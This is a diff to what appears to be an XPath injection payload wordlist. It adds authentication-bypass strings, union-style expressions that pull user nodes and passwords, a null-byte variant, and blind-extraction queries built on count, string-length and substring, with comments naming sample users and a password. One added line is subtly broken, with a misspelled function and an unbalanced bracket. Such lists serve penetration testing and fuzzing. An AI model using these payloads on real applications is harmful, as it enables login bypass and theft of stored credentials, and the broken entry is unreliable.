@@ -1,4 +1,4 @@
- ')]/child::node() | PseudoTime[contains(PseudoTime,'
+')]/child::node() | PseudoTime[contains(PseudoTime,'
 ' or '1'='1
 ' or ''='
 x' or 1=1 or 'x'='y
@@ -29,16 +29,30 @@ string(//user[name/text()=''or position()=2 or'' and password/text()='']/account
 admin' or '
 admin' or '1'='2
 string(//user[name/text()='admin' or '1'='2' and password/text()='']/account/text())
-
 ') or 1=1 or (' 
-') or 1=1] 
-') or 2=1] 
-')] 
-')] 
-') or 1=1]
-')] 
+') or 1=1] | //user/password[('')=('
+') or 2=1] | //user/node()[('')=('
+')] | //node()[('')=(' 
+') or 1=1] | //user/password[('')=('
+')] | //./node()[('')=('
+')] | //password%00
+//user/node()
+//user/child::node()
+//user[position()=1]/name #pepe
+//user[last()-1]/name #mark
+//name
+//name/node()
+//name/child::node()
+user/name
+user//name
+/user/name
+//user/name
+count(//user/node()) #3*3 = 9 (count all values)
+string-length(//user[position()=1]/child::node()[position()=1]) #Length of "pepe" = 4
+substrig(//user[position()=2/child::node()[position()=1],2,1) #Substring of mark: pos=2,length=1 --> "a"
+//user[position()=1]/child::node()[position()=2] #peponcio (password)
 ')]/../*[3][text()!=('
-')] | //user/*[1] | a
+')] | //user/*[1] | a[(' 
 ')] | //user/*[2] | a[(' 
 ')] | //user/*[3] | a[(' 
 ')] | //user/*[4] | a[(' 
